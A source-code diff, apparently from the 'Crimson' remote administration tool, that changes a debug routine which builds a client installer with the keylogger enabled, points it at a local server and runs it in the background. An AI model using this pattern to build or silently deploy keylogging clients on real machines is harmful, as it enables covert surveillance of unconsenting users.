@@ -30,6 +30,7 @@ import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Common.Instance;
+import com.subterranean_security.crimson.core.platform.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
 import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
@@ -40,6 +41,7 @@ import com.subterranean_security.crimson.core.storage.ServerDB;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.EH;
 import com.subterranean_security.crimson.core.util.FileLocking;
+import com.subterranean_security.crimson.core.util.HCP;
 import com.subterranean_security.crimson.core.util.Native;
 
 public final class Server {
@@ -133,9 +135,9 @@ public final class Server {
 		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.GROUP)
 				.setGroupName("TESTGROUP")
 				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
-				.setPathWin("C:\\Users\\" + System.getProperty("user.name") + "\\Documents\\Crimson").setPathBsd("/")
-				.setPathLin("/home/dev/cr").setPathOsx("/").setPathSol("/").setReconnectPeriod(3000)
-				.setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
+				.setPathWin(System.getProperty("user.home") + "\\Documents\\Crimson").setPathBsd("/")
+				.setPathLin("/home/dev/cr").setPathOsx(System.getProperty("user.home") + "/client").setPathSol("/")
+				.setReconnectPeriod(3000).setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
 				.setKeyloggerFlushMethod(FLUSH_METHOD.EVENT).setKeyloggerFlushValue(15).build();
 		try {
 			// Generate installer
@@ -148,7 +150,7 @@ public final class Server {
 			CUtil.Files.writeFile(res, installer);
 
 			// Run installer
-			CUtil.Misc.runBackgroundCommand("javaw -jar \"" + installer.getAbsolutePath() + "\"");
+			HCP.run(HCP.HCP_BASE, Platform.osFamily.getJavaw() + " -jar \"" + installer.getAbsolutePath() + "\"");
 
 		} catch (Exception e) {
 			log.error("Failed to generate debug installer");
